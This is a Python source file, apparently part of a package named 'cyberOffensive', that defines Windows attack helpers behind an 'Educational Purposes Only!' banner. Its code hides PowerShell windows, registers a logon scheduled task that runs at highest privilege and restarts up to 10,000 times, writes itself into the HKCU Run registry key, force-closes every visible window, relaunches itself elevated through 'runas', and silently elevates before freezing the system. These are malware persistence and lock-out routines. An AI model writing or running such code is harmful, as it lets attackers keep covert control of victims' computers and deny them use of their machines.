import ctypes
import subprocess
import sys
import os
import winreg as reg
import time

import cyberOffensive.native.windows_func as windows_func
from elevate import elevate


class ForWindows:
    def __init__(self):
        print("Educational Purposes Only!")

    def run_powershell_command(self, command, hide_window, task_name, pre_built_command):
        python_path = sys.executable

        if hide_window:
            createNoWindow = subprocess.CREATE_NO_WINDOW

        else:
            createNoWindow = 0

        if pre_built_command:
            powershell_command = f"""
            $taskName = "{task_name}"
            $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

            if ($taskExists) {{
                Write-Output "Task already exists. Skipping re-scheduling."
            }} else {{
                $action = New-ScheduledTaskAction -Execute "{python_path}"
                $trigger = New-ScheduledTaskTrigger -AtLogOn
                $settings = New-ScheduledTaskSettingsSet `
                    -AllowStartIfOnBatteries `
                    -DontStopIfGoingOnBatteries `
                    -DontStopOnIdleEnd `
                    -ExecutionTimeLimit 0 `
                    -RestartInterval (New-TimeSpan -Minutes 10) `
                    -RestartCount 10000  # Maximum restart attempts
                Register-ScheduledTask `
                    -Action $action `
                    -Trigger $trigger `
                    -Settings $settings `
                    -TaskName $taskName `
                    -RunLevel Highest `
                    -Force
            }}
            """

        else:
            powershell_command = command

        try:
            # Run PowerShell command in background and ensure no window is shown
            subprocess.Popen(
                ["powershell", "-Command", f"{powershell_command}; exit"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=createNoWindow
            )
        except Exception as e:
            print(f"An error occurred: {e}")

    def add_to_Reg(self, name_of_reg, location=sys.executable):
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_READ)
            try:
                reg.QueryValueEx(key, name_of_reg)
                print("Registry key already exists. Skipping addition.")
                reg.CloseKey(key)
                return 
            except FileNotFoundError:
                pass  

            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, name_of_reg, 0, reg.REG_SZ, location)
            print("Added script to registry for startup.")
            reg.CloseKey(key)

        except Exception as e:
            print(f"Could not add to registry: {e}. Try running the script as Administrator.")

    # Step 2: Close all open windows (Programs, settings, search box, etc.)
    def close_windows(self):
        user32 = ctypes.windll.user32
        PostMessage = user32.PostMessageW
        EnumWindows = user32.EnumWindows
        GetWindowText = user32.GetWindowTextW
        GetWindowTextLength = user32.GetWindowTextLengthW
        IsWindowVisible = user32.IsWindowVisible
        WM_CLOSE = 0x0010

        def close_all_windows(hwnd, _):
            if IsWindowVisible(hwnd):
                length = GetWindowTextLength(hwnd)
                if length > 0:
                    title = ctypes.create_unicode_buffer(length + 1)
                    GetWindowText(hwnd, title, length + 1)
                    PostMessage(hwnd, WM_CLOSE, 0, 0)  # Send close command

        # Fix: Wrap function in ctypes.WINFUNCTYPE
        EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
        callback = EnumWindowsProc(close_all_windows)

        EnumWindows(callback, 0)  # Call EnumWindows with the wrapped function

    def get_admin_Windows(self):
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, __file__, None, 1
        )
        sys.exit()

    def freeze(self):
        elevate(show_console=False)
        return windows_func.freeze()
    
    def unfreeze(self):
        return windows_func.unfreeze()
    
    def searchPathByname(self, name):
        return windows_func.searchpathbyname(name)
    
    def getpidbyname(self, name):
        return windows_func.getpidprocess(name)